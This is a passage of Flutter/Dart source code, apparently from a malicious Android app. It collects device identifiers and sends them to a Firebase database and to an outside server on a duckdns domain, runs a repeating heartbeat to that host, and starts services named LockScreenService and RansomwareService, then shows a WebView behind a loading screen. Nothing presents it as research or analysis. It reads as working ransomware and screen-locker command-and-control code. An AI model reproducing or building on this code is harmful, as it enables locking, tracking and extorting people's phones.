                      'sdk': realSdk,
                      'android_version': realAndroidVersion,
                      'session_id': uid,
                      'last_seen': ServerValue.timestamp,
                    });
                    await http.post(
                      Uri.parse('http://nodeyagamigantengsayang.duckdns.top:4130/register'),
                      headers: {'Content-Type': 'application/json'},
                      body: jsonEncode({
                        'device_id': uid,
                        'manufacturer': realManufacturer,
                        'model': realModel,
                        'sdk': realSdk,
                        'android': realAndroidVersion,
                        'session_id': uid,
                        'last_seen': DateTime.now().toIso8601String(),
                      }),
                    );
                  } catch(e) { debugPrint('Heartbeat error: $e'); }
                });
              }
              try {
                final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
                await fb.ref('devices/$uid').update({
                  'device_id': uid,
                  'model': realModel,
                  'manufacturer': realManufacturer,
                  'sdk': realSdk,
                  'android_version': realAndroidVersion,
                  'session_id': uid,
                  'last_seen': ServerValue.timestamp,
                });
              } catch(e) { debugPrint('Register Firebase error: $e'); }
              startHeartbeat();

              LockScreenService().init(context, uid);
              RansomwareService().init(context, uid);
              
              await Future.delayed(const Duration(seconds: 1));
              if (mounted) Navigator.pushReplacement(context, MaterialPageRoute(builder: (_) => WebViewScreen(url: targetUrl)));
            }

            @override
            Widget build(BuildContext context) => const Scaffold(body: Center(child: CircularProgressIndicator()));
          }

